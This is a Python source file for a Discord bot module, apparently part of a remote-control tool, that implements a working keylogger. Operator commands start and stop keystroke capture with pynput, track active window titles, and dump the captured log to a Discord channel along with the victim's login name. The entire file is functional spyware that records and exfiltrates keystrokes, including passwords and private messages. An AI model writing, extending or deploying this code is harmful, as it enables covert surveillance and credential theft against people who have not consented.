import os
import discord
from discord.ext import commands
from pynput import keyboard
import threading
import asyncio
import time
from datetime import datetime
from src.client.core.platform import Platform

class Keylogger(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.log_buffer = ""
        self.is_logging = False
        self.listener = None
        self.current_window = ""
        self.window_lock = threading.Lock()
        
    def get_active_window(self):
        """Internal helper to fetch the active window title."""
        try:
            if Platform.is_windows():
                import pygetwindow as gw
                window = gw.getActiveWindow()
                return window.title if window else "Unknown"
            elif Platform.is_linux():
                import subprocess
                # Check for xdotool presence once? No, just try to run it.
                result = subprocess.run(["xdotool", "getactivewindow", "getwindowname"], 
                                     capture_output=True, text=True, timeout=1)
                return result.stdout.strip() if result.returncode == 0 else "Linux Window"
            return "N/A"
        except:
            return "N/A"

    def _window_tracker(self):
        """Background thread to update the active window title periodically."""
        while self.is_logging:
            new_window = self.get_active_window()
            with self.window_lock:
                if new_window != self.current_window:
                    self.current_window = new_window
                    self.log_buffer += f"\n\n--- [Window: {self.current_window}] ---\n"
            time.sleep(5) # Update every 5 seconds

    def on_press(self, key):
        if not self.is_logging:
            return False
            
        try:
            # Handle special keys
            if hasattr(key, 'char') and key.char is not None:
                self.log_buffer += key.char
            else:
                k = str(key).replace("Key.", "")
                if k == "space":
                    self.log_buffer += " "
                elif k == "enter":
                    self.log_buffer += "\n"
                elif k == "backspace":
                    self.log_buffer += " [BACKSPACE] "
                elif k == "tab":
                    self.log_buffer += " [TAB] "
                elif k == "caps_lock":
                    self.log_buffer += " [CAPS] "
                elif k in ["shift", "shift_r", "ctrl", "ctrl_r", "alt", "alt_gr", "cmd", "cmd_r"]:
                    pass # Don't log modifier keys alone to keep logs clean
                else:
                    self.log_buffer += f" [{k.upper()}] "
        except Exception as e:
            pass

    @commands.command(name="keylog_start", help="Start the keylogger.")
    async def start_logging(self, ctx):
        if self.is_logging:
            await ctx.send("⚠️ Keylogger is already running.")
            return

        self.is_logging = True
        self.log_buffer += f"\n--- Keylogger Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n"
        
        # Start the listener
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        
        # Start the window tracker thread
        threading.Thread(target=self._window_tracker, daemon=True).start()
        
        await ctx.send("✅ Keylogger started.")

    @commands.command(name="keylog_stop", help="Stop the keylogger.")
    async def stop_logging(self, ctx):
        if not self.is_logging:
            await ctx.send("⚠️ Keylogger is not running.")
            return

        self.is_logging = False
        if self.listener:
            self.listener.stop()
        
        await ctx.send("🛑 Keylogger stopped.")

    @commands.command(name="keylog_dump", help="Dump the current keylogs.")
    async def dump_logs(self, ctx):
        if not self.log_buffer:
            await ctx.send("📝 No logs captured yet.")
            return

        # Prepare filename
        log_file = f"keylogs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        try:
            with open(log_file, "w", encoding="utf-8") as f:
                f.write(self.log_buffer)

            await ctx.send(f"📄 Keylogs for `{os.getlogin()}`:", file=discord.File(log_file))
            os.remove(log_file)
            
            # Optional: Ask if buffer should be cleared?
            # For now, we keep it to prevent data loss if upload fails
        except Exception as e:
            await ctx.send(f"❌ Error dumping logs: {str(e)}")

    @commands.command(name="keylog_clear", help="Clear the current keylog buffer.")
    async def clear_logs(self, ctx):
        self.log_buffer = ""
        await ctx.send("🧹 Keylog buffer cleared.")

async def setup(bot):
    await bot.add_cog(Keylogger(bot))
